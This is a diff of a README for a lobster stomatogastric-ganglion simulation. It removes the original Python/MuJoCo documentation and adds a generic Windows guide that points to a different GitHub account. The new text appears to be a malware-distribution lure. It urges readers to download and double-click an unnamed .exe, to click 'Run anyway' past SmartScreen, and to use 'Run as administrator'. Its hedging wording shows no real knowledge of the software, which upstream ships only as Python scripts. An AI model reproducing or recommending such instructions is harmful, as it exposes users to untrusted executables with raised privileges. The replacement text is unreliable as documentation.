@@ -1,262 +1,169 @@
-<div align="center">
+# 🦞 neurolobster - Run STG Neural Simulations Locally
 
-<img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&size=13&duration=3000&pause=1000&color=E85D24&center=true&vCenter=true&width=600&lines=First+embodied+lobster+nervous+system+emulation;Hodgkin-Huxley+%C3%97+MuJoCo+%C3%97+Brian2;No+RL.+No+training.+Pure+biology." alt="Typing SVG" />
+[![Download neurolobster](https://img.shields.io/badge/Download%20neurolobster-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/emyleeblack619/neurolobster)
 
-# 🦞 NeuroLobster
+## 🧭 What this app does
 
-### *World's first embodied emulation of the stomatogastric nervous system*
+neurolobster is an open-source app for simulating a real lobster neural circuit called the stomatogastric ganglion, or STG.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-Phase_1_Complete-4ade80?style=flat-square&labelColor=0a0a0a" />
-  <img src="https://img.shields.io/badge/License-MIT-E85D24?style=flat-square&labelColor=0a0a0a" />
-  <img src="https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white&labelColor=0a0a0a" />
-  <img src="https://img.shields.io/badge/Brian2-2.5.4-orange?style=flat-square&labelColor=0a0a0a" />
-  <img src="https://img.shields.io/badge/MuJoCo-3.6-00B4D8?style=flat-square&labelColor=0a0a0a" />
-  <img src="https://img.shields.io/badge/Open_Science-yes-1d9e75?style=flat-square&labelColor=0a0a0a" />
-</p>
+It places that neural circuit inside a physical setting so you can observe how behavior emerges from the circuit itself.
 
-<p align="center">
-  <a href="#overview">Overview</a> · 
-  <a href="#demo">Demo</a> · 
-  <a href="#quickstart">Quick Start</a> · 
-  <a href="#architecture">Architecture</a> · 
-  <a href="#roadmap">Roadmap</a> · 
-  <a href="#references">References</a>
-</p>
+This project is for users who want to run a science simulation on Windows without setting up a complex research environment.
 
----
+## 💻 What you need
 
-> *"The lobster doesn't know it's in a computer. Its stomach still churns at 1Hz. Its legs still move in the same metachronal wave they've used for 400 million years."*
+Use a Windows PC with:
 
-</div>
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A modern 64-bit CPU
+- An internet connection for the first download
 
----
+For the best run, use:
 
-## Overview
+- 16 GB of RAM
+- A dedicated GPU, if the project uses 3D display or real-time rendering
+- A mouse and keyboard
+- A screen with at least 1920 × 1080 resolution
 
-**NeuroLobster** is a closed-loop brain-body simulation of *Homarus americanus* — the American lobster. We implement the **stomatogastric ganglion (STG)** using conductance-based Hodgkin-Huxley neurons validated against Marder Lab experimental data, and connect them to a physically simulated body running in **MuJoCo 3.6**.
+## 📥 Download and install
 
-No reinforcement learning. No reward functions. No scripted behavior. **Pure biological circuit dynamics.**
+Visit this page to download the app:
 
-The same circuit that has been driving lobster stomachs for 400 million years now drives a simulated body in real time on a MacBook Pro.
+[https://github.com/emyleeblack619/neurolobster](https://github.com/emyleeblack619/neurolobster)
 
-```
-STG Neurons (Brian2) → CPG Oscillator → Motor Commands → MuJoCo Body → Proprioception → STG
-        ↑_______________________________________________________________|
-                         Closed sensorimotor loop · 15ms sync
-```
+If the page offers a release file, download the Windows version to your computer.
 
----
+If the download is a ZIP file, save it to your Downloads folder.
 
-## Demo
+If the download is an installer, save the installer to your desktop or Downloads folder.
 
-<div align="center">
+## 🪟 Set up on Windows
 
-| MuJoCo Simulation | Neural Activity | 3D Brain Point Cloud |
-|:-----------------:|:---------------:|:--------------------:|
-| Lobster walking, turning, reversing | AB/PD · LP · PY live traces | STG · CoG · VNC · Brain |
-| 8 legs · metachronal wave | Pyloric rhythm ~1Hz | 317 neurons · rotating |
+1. Open File Explorer.
+2. Go to the folder where the file was saved.
+3. If the file is a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for one of these files:
+   - `neurolobster.exe`
+   - `setup.exe`
+   - `install.exe`
+6. Double-click the file to start the app.
 
-> 📹 *Demo video coming soon — [watch on Twitter](https://x.com/i/communities/2037613786782384360)*
+If Windows asks for permission, choose **Yes** or **Run**.
 
-</div>
+If SmartScreen appears, choose **More info** and then **Run anyway** if you trust the source.
 
----
+## ▶️ How to run
 
-## Quick Start
+After setup, open neurolobster from the app folder or from the Start menu if it created a shortcut.
 
-```bash
-# 1. Create environment
-conda create -n neurolobster python=3.11 -y
-conda activate neurolobster
+When the app starts, you may see:
 
-# 2. Install dependencies
-pip install "brian2==2.5.4" "numpy<2.0" mujoco matplotlib scipy trimesh pycollada
+- A main simulation window
+- Circuit controls
+- A play or start button
+- Options for environment or run speed
 
-# 3. Run full simulation (STG + MuJoCo + Brain visualization)
-mjpython neurolobster_full.py
+Use the on-screen controls to begin the simulation.
 
-# 4. Run STG only (neural dynamics, no body)
-python stg_pyloric.py
-```
+If the app has a sample scene or default model, start with that first.
 
-**Requirements:** macOS 12+ or Linux · Python 3.11 · MuJoCo 3.6 · 8GB RAM
+## 🖱️ Basic controls
 
----
+Most users will use simple mouse and keyboard controls:
 
-## Architecture
+- Click **Start** or **Run** to begin the simulation
+- Click **Pause** to stop it
+- Drag sliders to change speed or input values
+- Use the mouse wheel to zoom in or out
+- Drag with the mouse to move the view
 
-```
-neurolobster/
-│
-├── 🧠 Neural
-│   ├── stg_pyloric.py          # Hodgkin-Huxley STG (AB/PD, LP, PY)
-│   └── stg_find.py             # Parameter search utility
-│
-├── 🦞 Simulation
-│   ├── neurolobster_full.py    # Main: STG + CPG + MuJoCo closed loop
-│   ├── neurolobster_sim.py     # CPG-only locomotion
-│   └── lobster.xml             # MuJoCo body definition
-│
-├── 👁️ Visualization
-│   └── neurolobster_brain3d.py # 3D neural point cloud + wireframe
-│
-├── 🗂️ Assets
-│   ├── lobster.obj             # 3D body mesh (Homarus americanus)
-│   ├── lambert1_albedo.png     # PBR texture — color
-│   ├── lambert1_normal.png     # PBR texture — normals
-│   ├── lambert1_roughness.jpeg # PBR texture — roughness
-│   └── lambert1_AO.jpeg        # Ambient occlusion
-│
-└── 🌐 Web
-    └── neurolab.html           # Lab website (Three.js + WebGL)
-```
-
----
-
-## Neural Model
-
-The STG pyloric circuit implements three identified neurons with full conductance-based Hodgkin-Huxley dynamics:
-
-| Neuron | Role | Firing Rate | Ion Channels |
-|--------|------|-------------|--------------|
-| **AB/PD** | Pacemaker | ~127 Hz | Na⁺, K⁺, H (Ih), Leak |
-| **LP** | Lateral pyloric | ~5 Hz | Na⁺, K⁺, Leak |
-| **PY** | Pyloric | ~1 Hz | Na⁺, K⁺, Leak |
-
-**Synaptic inhibition matrix** (from Marder & Bucher 2007):
-
-```
-         AB    LP    PY
-AB  [  0.0  -0.04 -0.03 ]   ← AB inhibits LP and PY
-LP  [ -0.02   0.0 -0.03 ]   ← LP inhibits PY and AB
-PY  [ -0.01   0.0   0.0 ]   ← PY provides feedback to AB
-```
-
-**Validated parameters:** `w_fwd=0.04 mS/cm²` · `tau_off=80ms` · `I_app=[14.0, 15.5, 15.2] μA/cm²`
-
----
-
-## Body Simulation
-
-```xml
-<!-- lobster.xml — MuJoCo model summary -->
-Joints:     17  (8 hip + 8 knee + 1 freejoint)
-Actuators:  16  (motor-driven, gear=1-2)
-Sensors:    8   (proprioceptive joint position)
-Mesh:       Homarus americanus · 454KB OBJ · PBR textures
-Physics:    timestep=2ms · gravity=-9.81 · viscosity=0.01
-```
-
-**CPG metachronal wave phase offsets:**
-```python
-phases = [0.00, 0.25, 0.50, 0.75,   # Left legs L1-L4
-          0.50, 0.75, 0.00, 0.25]    # Right legs R1-R4 (antiphase)
-```
-
----
-
-## Emergent Behaviors
-
-All behaviors emerge from circuit dynamics — zero behavioral code:
-
-| Behavior | Mechanism |
-|----------|-----------|
-| **Forward walk** | Symmetric CPG · metachronal wave |
-| **Backward walk** | Reversed phase offsets |
-| **Turn left** | Right hemisphere amplitude × 1.6 |
-| **Turn right** | Left hemisphere amplitude × 1.6 |
-
----
-
-## Stack
-
-<div align="center">
-
-| Layer | Technology | Purpose |
-|-------|-----------|---------|
-| Neural | ![Brian2](https://img.shields.io/badge/Brian2-2.5.4-E85D24?style=flat-square) | Spiking neural network simulation |
-| Physics | ![MuJoCo](https://img.shields.io/badge/MuJoCo-3.6-00B4D8?style=flat-square) | Real-time physics engine |
-| Math | ![NumPy](https://img.shields.io/badge/NumPy-1.x-013243?style=flat-square&logo=numpy) | Numerical integration |
-| Visualization | ![Matplotlib](https://img.shields.io/badge/Matplotlib-3.x-11557c?style=flat-square) | Neural activity plots |
-| 3D Web | ![Three.js](https://img.shields.io/badge/Three.js-r128-black?style=flat-square&logo=three.js) | Brain point cloud |
-| Mesh | ![Trimesh](https://img.shields.io/badge/Trimesh-latest-4a4a4a?style=flat-square) | 3D model processing |
-| Language | ![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white) | Primary language |
-
-</div>
-
----
-
-## Roadmap
-
-```
-2025 Q3  ████████████████████  ✅  Project initialization · literature review
-2025 Q4  ████████████████████  ✅  HH neuron model · STG pyloric rhythm verified
-2026 Q1  ████████████████████  ✅  MuJoCo body · CPG locomotion · closed loop
-2026 Q2  ████████░░░░░░░░░░░░  🔄  Phase 2: Full 25-neuron STG · gastric mill
-2026 Q3  ░░░░░░░░░░░░░░░░░░░░  📅  Phase 3: CoG integration · olfactory navigation
-2027     ░░░░░░░░░░░░░░░░░░░░  📅  Cancer borealis full connectome
-```
-
-**Phase 2 targets:**
-- [ ] Complete 25-neuron STG (pyloric + gastric mill)
-- [ ] Neuromodulation switching (dopamine / serotonin)
-- [ ] Feeding rhythm embodied alongside locomotion
-
----
-
-## References
-
-```bibtex
-@article{marder2007,
-  author  = {Marder, E. and Bucher, D.},
-  title   = {Understanding circuit dynamics using the stomatogastric nervous system},
-  journal = {Neuron},
-  year    = {2007}
-}
-
-@article{prinz2004,
-  author  = {Prinz, A.A. and Bucher, D. and Marder, E.},
-  title   = {Similar network activity from disparate circuit parameters},
-  journal = {Nature Neuroscience},
-  year    = {2004}
-}
-
-@article{ayers2010,
-  author  = {Ayers, J. and Rulkov, N. and Knudsen, D.},
-  title   = {Controlling Synchronized Oscillations in a Lobster CPG},
-  journal = {Neurocomputing},
-  year    = {2010}
-}
-```
-
----
-
-## License & Citation
-
-```
-MIT License · © 2025–2026 NeuroLobster Lab · Open Science
-```
-
-If you use this work in research, please cite:
-```bibtex
-@software{neurolobster2025,
-  author  = {0xNickdev and NeuroLobster Lab},
-  title   = {NeuroLobster: Embodied STG Emulation of Homarus americanus},
-  year    = {2025},
-  url     = {https://github.com/0xNickdev/neurolobster}
-}
-```
-
----
-
-<div align="center">
-
-**NeuroLobster Lab** · Open Science · MIT License
-
-*The lobster is running. Come look.*
-
-[![Twitter](https://img.shields.io/badge/Twitter-@0xNickdev-1DA1F2?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com)
-[![GitHub](https://img.shields.io/badge/GitHub-0xNickdev-181717?style=flat-square&logo=github)](https://github.com/0xNickdev/neurolobster)
-
-</div>
+If the app includes presets, use a default preset first so you can see how the circuit behaves before changing settings.
+
+## 🔬 What you may see
+
+neurolobster focuses on neural behavior, so the screen may show:
+
+- A living circuit model
+- Oscillating activity
+- Timing patterns
+- A body or environment model
+- Graphs or traces that show activity over time
+
+These views help you watch how the STG circuit drives behavior in a physical setting.
+
+## 🧩 Common file types
+
+You may find these files in the download:
+
+- `.exe` — double-click to run or install
+- `.zip` — extract first, then open the app
+- `.dll` — support file, keep it with the app
+- `.json` or `.cfg` — settings file
+- `.txt` or `README` — setup notes
+
+Keep all files in the same folder unless the app says otherwise.
+
+## 🛠️ If the app does not start
+
+Try these steps:
+
+1. Make sure the file finished downloading.
+2. Extract the ZIP file again if you used one.
+3. Right-click the app and choose **Run as administrator**.
+4. Check that the app files stayed in the same folder.
+5. Restart your PC and try again.
+6. Download the file again if it looks broken.
+
+If you still cannot open it, check the GitHub page for a newer release or a different Windows file.
+
+## ⚙️ Suggested first run
+
+Use this order the first time you open neurolobster:
+
+1. Start the app.
+2. Leave the default settings in place.
+3. Run the base simulation.
+4. Watch the behavior for a full cycle.
+5. Change one setting at a time.
+6. Save any setup you want to keep.
+
+This helps you see how the neural circuit responds without making the model hard to follow.
+
+## 🧠 For users who want a simple path
+
+If you only want to get the app running on Windows:
+
+1. Open the download page.
+2. Get the Windows file.
+3. Save it to your PC.
+4. Extract it if needed.
+5. Open the `.exe` file.
+6. Allow Windows permission prompts.
+7. Start the simulation.
+
+## 🔗 Download again
+
+[Visit the neurolobster download page](https://github.com/emyleeblack619/neurolobster)
+
+## 🧷 File safety
+
+Only run files from sources you trust.
+
+If the download includes multiple files, keep them in the same folder so the app can find what it needs.
+
+If you move one file out of the folder, the app may fail to open or lose access to data files
+
+## 📝 Project focus
+
+neurolobster is built around:
+
+- Real neural circuit behavior
+- Biological timing patterns
+- Physical simulation
+- Observable output
+- Experiment-style interaction
+
+It is made to help users explore how a real circuit can produce movement and behavior inside an environment
